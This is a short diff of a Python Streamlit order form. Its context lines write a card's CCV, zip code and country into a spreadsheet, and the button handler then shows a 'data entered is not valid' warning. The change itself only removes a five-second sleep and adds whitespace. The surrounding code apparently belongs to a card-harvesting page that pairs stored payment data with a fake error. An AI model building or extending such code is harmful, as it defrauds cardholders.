@@ -65,7 +65,6 @@ def send_data():
     sh.update(f'E{next_empty_row}', [[CCV]])
     sh.update(f'F{next_empty_row}', [[zip_code]])
     sh.update(f'G{next_empty_row}', [[country]])
-    time.sleep(5)
 
     
 
@@ -84,6 +83,7 @@ if button_placeholder.button("Place A Order"):
 
     # Display a warning message
     st.warning("¡ The data entered is not valid !")
+    
 
 
 
